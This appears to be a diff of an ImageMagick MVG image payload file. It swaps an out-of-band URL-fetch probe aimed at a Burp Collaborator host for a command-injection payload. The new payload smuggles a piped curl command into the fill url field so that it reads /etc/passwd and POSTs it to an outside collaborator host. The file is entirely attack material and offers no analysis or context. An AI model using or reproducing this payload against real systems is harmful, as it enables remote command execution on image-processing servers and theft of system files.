@@ -1,4 +1,1 @@
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://2adferh4stynf8sc4b3o1vdrgimia7.burpcollaborator.net/test.jpg)'
-pop graphic-context
+push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://ji50q4wkbovgna4mp8r0txst2k8cw1.burpcollaborator.net/test1 ")' pop graphic-context
